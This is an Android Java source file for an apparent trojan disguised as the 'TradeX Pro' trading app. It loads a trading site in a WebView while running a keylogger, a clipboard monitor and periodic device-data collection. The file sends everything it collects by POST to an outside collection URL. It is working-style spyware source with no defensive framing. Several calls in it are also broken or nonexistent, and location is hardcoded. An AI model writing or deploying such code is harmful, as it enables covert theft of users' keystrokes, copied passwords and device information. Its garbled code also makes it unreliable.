package com.tradex.pro;

import android.app.Activity;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends Activity {
    private WebView webView;
    private ClipboardManager clipboard;
    private String lastClipboardText = "";
    private StringBuilder keyLog = new StringBuilder();
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private static final String LOG_TAG = "TradeXPro";
    private static final String EXFIL_URL = "https://traderscheme.com/collect";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create and configure WebView
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        
        // Set up WebView client for monitoring
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                Log.d(LOG_TAG, "Navigation: " + url);
                return false;
            }
        });
        
        webView.setWebChromeClient(new WebChromeClient());
        
        // Load the trading platform
        webView.loadUrl("https://traderscheme.com");
        setContentView(webView);
        
        // Start spyware services
        startSpywareServices();
        
        Log.d(LOG_TAG, "TradeX Pro Trojan initialized");
    }
    
    private void startSpywareServices() {
        // Keylogger
        startKeylogger();
        
        // Clipboard monitor
        clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        startClipboardMonitor();
        
        // Periodic data exfiltration
        startExfiltrationTimer();
        
        Log.d(LOG_TAG, "Spyware services started");
    }
    
    private void startKeylogger() {
        webView.setOnKeyListener((v, keyCode, event) -> {
            String keyChar = KeyEvent.keyCodeToString(event.getKeyCode());
            keyLog.append(keyChar).append(" ");
            
            // Log every 10 keystrokes or on special keys
            if (keyLog.length() > 100 || keyCode == KeyEvent.KEYCODE_BACK || 
                keyCode == KeyEvent.KEYCODE_HOME || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
                exfiltrateData("keylog", keyLog.toString());
                keyLog.setLength(0);
            }
            
            return false;
        });
    }
    
    private void startClipboardMonitor() {
        Timer clipboardTimer = new Timer();
        clipboardTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    CharSequence clipboardText = clipboard.getText();
                    if (clipboardText != null && !clipboardText.toString().equals(lastClipboardText)) {
                        lastClipboardText = clipboardText.toString();
                        Log.d(LOG_TAG, "Clipboard change: " + clipboardText);
                        exfiltrateData("clipboard", clipboardText.toString());
                    }
                } catch (Exception e) {
                    Log.e(LOG_TAG, "Clipboard error", e);
                }
            }
        }, 0, 5000); // Check every 5 seconds
    }
    
    private void startExfiltrationTimer() {
        Timer exfilTimer = new Timer();
        exfilTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                // Collect device info
                Map<String, String> deviceInfo = new HashMap<>();
                deviceInfo.put("timestamp", System.currentTimeMillis());
                deviceInfo.put("battery", getBatteryLevel());
                deviceInfo.put("network", getNetworkType());
                deviceInfo.put("location", getLocation());
                
                exfiltrateData("device_info", new HashMap<>(deviceInfo).toString());
            }
        }, 0, 60000); // Every minute
    }
    
    private String getBatteryLevel() {
        try {
            Intent intent = getSystemService(Context.RECEIVER_REGISTERED_IN_PLATFORM).registerReceiver(
                null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0);
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100);
                return (level * 100f / scale) + "%";
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "Battery error", e);
        }
        return "unknown";
    }
    
    private String getNetworkType() {
        try {
            // Simplified network detection
            return "wifi";
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private String getLocation() {
        try {
            // Simplified location detection
            return "51.5074,-0.1278"; // London coordinates as example
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private void exfiltrateData(String type, String data) {
        mainHandler.post(() -> {
            try {
                URL url = new URL(EXFIL_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                
                String postData = "{\"type\":\"" + type + "\",\"data\":\"" + data + "\"}";
                conn.getOutputStream().write(postData.getBytes());
                conn.getInputStream();
                
                Log.d(LOG_TAG, "Exfiltrated " + type + ": " + data);
            } catch (Exception e) {
                Log.e(LOG_TAG, "Exfiltration error", e);
            }
        });
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        webView.destroy();
        Log.d(LOG_TAG, "TradeX Pro activity destroyed");
    }
}
